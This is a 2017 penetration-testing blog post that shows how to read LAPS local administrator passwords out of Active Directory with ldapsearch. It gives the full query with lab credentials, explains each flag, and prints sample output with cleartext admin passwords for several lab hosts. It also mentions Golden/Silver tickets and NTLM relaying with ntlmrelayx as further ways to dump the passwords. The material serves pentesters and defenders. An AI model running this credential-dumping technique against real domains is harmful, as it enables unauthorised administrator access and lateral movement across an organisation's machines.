<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>Dump LAPS passwords with ldapsearch &middot; Rob &#39;mubix&#39; Fuller</title>
        <meta name="description" content="If you&rsquo;ve ever been pentesting an organization that had LAPS, you know that it is the best solution for randomizing local administrator passwords on the planet. (You should just be leaving them disabled).
LAPS stores it&rsquo;s information in Active Directory:
 The expiration time: ms-Mcs-AdmPwdExpirationTime: 131461867015760024
 And the actual password in clear text: ms-Mcs-AdmPwd: %v!e#7S#{s})&#43;y2yS#(
  When LAPS first came it, any user in Active Directory could read it.">
        <meta name="HandheldFriendly" content="True">
        <meta name="MobileOptimized" content="320">
        <meta name="generator" content="Hugo 0.30" />
        <meta name="robots" content="index,follow">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        <link rel="stylesheet" href="https://room362.com/dist/styles.css">
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,400,600,700,300&subset=latin,cyrillic-ext,latin-ext,cyrillic">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
        
    </head>
    <body>
        
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-198967-1', 'auto');
ga('send', 'pageview');
</script>


        <div id="wrapper">
            <header class="site-header">
                <div class="container">
                    <div class="site-title-wrapper">
                        
                            <h1 class="site-title">
                                <a title="Room362" href="https://room362.com/">Room362</a>
                            </h1>
                        
                        <a class="button-square" href="https://room362.com/index.xml"><i class="fa fa-rss"></i></a>
                        
                            <a class="button-square button-social hint--top" data-hint="Twitter" title="Twitter" href="https://twitter.com/mubix">
                                <i class="fa fa-twitter"></i>
                            </a>
                        
                        
                        
                            <a class="button-square button-social hint--top" data-hint="Github" title="Github" href="https://github.com/mubix">
                                <i class="fa fa-github-alt"></i>
                            </a>
                        
                        
                        
                            <a class="button-square button-social hint--top" data-hint="LinkedIn" title="LinkedIn" href="https://linkedin.com/in/mubix">
                                <i class="fa fa-linkedin"></i>
                            </a>
                        
                        
                            <a class="button-square button-social hint--top" data-hint="Google+" title="Google+" href="https://google.com/&#43;mubix">
                                <i class="fa fa-google-plus"></i>
                            </a>
                        
                        
                    </div>

                    <ul class="site-nav">
                        
    <li class="site-nav-item">
        <a title="Brandon" href="/brandon/">Brandon</a>
    </li>

    <li class="site-nav-item">
        <a title="About Me" href="/about/">About Me</a>
    </li>

    <li class="site-nav-item">
        <a title="Start in Infosec" href="/start/">Start in Infosec</a>
    </li>

    <li class="site-nav-item">
        <a title="Attacker KB" href="https://attackerkb.com/">Attacker KB</a>
    </li>

    <li class="site-nav-item">
        <a title="Projects" href="/projects/">Projects</a>
    </li>

                    </ul>
                </div>
            </header>

            <div id="container">


<div class="container">
    <article class="post-container" itemscope="" itemtype="http://schema.org/BlogPosting">
        <header class="post-header">
    <h1 class="post-title" itemprop="name headline">Dump LAPS passwords with ldapsearch</h1>
    
    <p class="post-date">
        <span>Published <time datetime="2017-07-24" itemprop="datePublished">Mon, Jul 24, 2017</time></span>
        <span>by</span>
        <span itemscope="" itemprop="author" itemtype="https://schema.org/Person">
            <span itemprop="name">
                <a href="https://twitter.com/mubix" itemprop="url" rel="author">Rob &#39;mubix&#39; Fuller</a>
            </span>
        </span>
    </p>
</header>

        <div class="post-content clearfix" itemprop="articleBody">
    

    <p><img src="/images/2017/ldapsearch_laps_rights.png" alt="" /></p>

<p>If you&rsquo;ve ever been pentesting an organization that had LAPS, you know that it is the best solution for randomizing local administrator passwords on the planet. (You should just be leaving them disabled).</p>

<p>LAPS stores it&rsquo;s information in Active Directory:</p>

<ul>
<li><p>The expiration time: <code>ms-Mcs-AdmPwdExpirationTime: 131461867015760024</code></p></li>

<li><p>And the actual password in clear text: <code>ms-Mcs-AdmPwd: %v!e#7S#{s})+y2yS#(</code></p></li>
</ul>

<p>When LAPS first came it, any user in Active Directory could read it. Microsoft fixed that, you now have to have the <code>All extended rights</code> permission to the object or Full Control of it.</p>

<p>In many organizations, there are pockets of <strong>OU</strong> admins, or even standard users that are in charge of a specific set of Users and (in particular) computers in which they have full control over.</p>

<p>There is already a Metasploit module thanks to <a href="https://github.com/Meatballs1">Meatballs</a>:
<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/enum_laps.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/enum_laps.rb</a>. But, unfortunately I don&rsquo;t always have access to a Meterpreter session to run the module.</p>

<p>Using <code>ldapsearch</code> (which is included in the package <code>ldapscripts</code> on Debian/Ubuntu) can be used to make the same query that the module does. Here is an example run:</p>

<pre><code>ldapsearch -x -h 192.168.80.10 -D \
&quot;helpdesk&quot; -w ASDqwe123 -b &quot;dc=sittingduck,dc=info&quot; \
&quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd
</code></pre>

<p>Lets break this down:</p>

<ul>
<li><code>-x</code> - Use basic authentication</li>
<li><code>-h 192.168.80.10</code> - Connect to the Domain Controller for ldap</li>
<li><code>-D &quot;helpdesk&quot; -w ASDqwe123</code> - Login as the <code>helpdesk</code> user, with the password <code>ASDqwe123</code></li>
<li><code>-b &quot;dc=sittingduck,dc=info&quot;</code> - This loads the base LDAP object of the entire domain.</li>
<li><code>&quot;(ms-MCS-AdmPwd=*)&quot;</code> - Filter out any objects that I can&rsquo;t see a value for <code>ms-MCS-AdmPwd</code> for. (If you have rights as that user to see even one Administrator password, this will show it.)</li>
<li><code>ms-MCS-AdmPwd</code> - Only show me the <code>ms-MCS-AdmPwd</code> object (which by default includes the object name and DN so you will still know what host it belongs to)</li>
</ul>

<p>What does that look like?</p>

<pre><code>$ ldapsearch -x -h 192.168.80.10 -D &quot;helpdesk&quot; -w ASDqwe123 -b &quot;dc=sittingduck,dc=info&quot; &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd
# extended LDIF
#
# LDAPv3
# base &lt;dc=sittingduck,dc=info&gt; with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd
#

# DC1, Domain Controllers, sittingduck.info
dn: CN=DC1,OU=Domain Controllers,DC=sittingduck,DC=info
ms-Mcs-AdmPwd: 2F1i/++N0H+G]{Y&amp;,F

# SDCLIENT_DAWIN7, LabComputers, Lab, sittingduck.info
dn: CN=SDCLIENT_DAWIN7,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info
ms-Mcs-AdmPwd: 8CDR4,2UE8BA{zw2@RR

# SD_WSUS_2012, LabComputers, Lab, sittingduck.info
dn: CN=SD_WSUS_2012,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info
ms-Mcs-AdmPwd: +3!UY5@g9B.64RV2z/T

# WIN-PM0ID6F0AHN, LabComputers, Lab, sittingduck.info
dn: CN=WIN-PM0ID6F0AHN,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info
ms-Mcs-AdmPwd: %v!e#7S#{s})+y2yS#(

# search reference
ref: ldap://research.sittingduck.info/DC=research,DC=sittingduck,DC=info

# search reference
ref: ldap://ForestDnsZones.sittingduck.info/DC=ForestDnsZones,DC=sittingduck,D
 C=info

# search reference
ref: ldap://DomainDnsZones.sittingduck.info/DC=DomainDnsZones,DC=sittingduck,D
 C=info

# search reference
ref: ldap://sittingduck.info/CN=Configuration,DC=sittingduck,DC=info

# search result
search: 2
result: 0 Success
</code></pre>

<p>Now, just having the local admin password doesn&rsquo;t ensure that it&rsquo;s enabled, but there is a good bet that you are good to go now.</p>

<p><strong>P.S.</strong> You can also authenticate using Kerberos (think Golden/Silver tickets)</p>

<p><strong>P.P.S</strong> Because Windows doesn&rsquo;t (to the best of my knowledge) require signing on Domain Controllers for LDAP connections yet (probably does in 2016 or will soon), with a little bit of coding you can get <a href="https://github.com/CoreSecurity/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx</a> to dump LAPS passwords ;-)</p>

</div>

        <footer class="post-footer clearfix">
    
        <p class="post-tags">
            <span>Tagged:</span>
            
            
                <a href="/tags/defcon/">defcon</a>, 
            
                <a href="/tags/blackhat/">blackhat</a>, 
            
                <a href="/tags/ldapsearch/">ldapsearch</a>, 
            
                <a href="/tags/laps/">LAPS</a>
            
        </p>
    

    <a class="muut" href="https://muut.com/i/room362/comments" type="dynamic">room362</a> <script src="//cdn.muut.com/1/moot.min.js"></script>

    <div class="share">
        
            <a class="icon-twitter" href="https://twitter.com/share?text=Dump%20LAPS%20passwords%20with%20ldapsearch&url=https%3a%2f%2froom362.com%2fpost%2f2017%2fdump-laps-passwords-with-ldapsearch%2f"
                onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
                <i class="fa fa-twitter"></i>
                <span class="hidden">Twitter</span>
            </a>
        

        
            <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2froom362.com%2fpost%2f2017%2fdump-laps-passwords-with-ldapsearch%2f"
                onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
                <i class="fa fa-facebook"></i>
                <span class="hidden">Facebook</span>
            </a>
        

        
            <a class="icon-google-plus" href="https://plus.google.com/share?url=https%3a%2f%2froom362.com%2fpost%2f2017%2fdump-laps-passwords-with-ldapsearch%2f"
              onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
              <i class="fa fa-google-plus"></i>
                <span class="hidden">Google+</span>
            </a>
        
        
    </div>
</footer>


        
    </article>
</div>

            </div>
        </div>

        <footer class="footer">
            <div class="container">
                <div class="site-title-wrapper">
                    <h1 class="site-title">
                        <a title="Room362" href="https://room362.com/">Room362</a>
                    </h1>
                    <a class="button-square button-jump-top js-jump-top" href="#">
                        <i class="fa fa-angle-up"></i>
                    </a>
                </div>

                <p class="footer-copyright">
                    <span>&copy; 2017 / Powered by <a href="https://gohugo.io/">Hugo</a></span>
                </p>
                <p class="footer-copyright">
                    <span><a href="https://github.com/roryg/ghostwriter">Ghostwriter theme</a> By <a href="http://jollygoodthemes.com">JollyGoodThemes</a></span>
                    <span>/ <a href="https://github.com/jbub/ghostwriter">Ported</a> to Hugo By <a href="https://github.com/jbub">jbub</a></span>
                </p>
            </div>
        </footer>

        <script src="https://room362.com/js/jquery-1.11.3.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/highlight.min.js"></script>
        <script src="https://room362.com/js/jquery.fitvids.js"></script>
        <script src="https://room362.com/js/scripts.js"></script>
    </body>
</html>

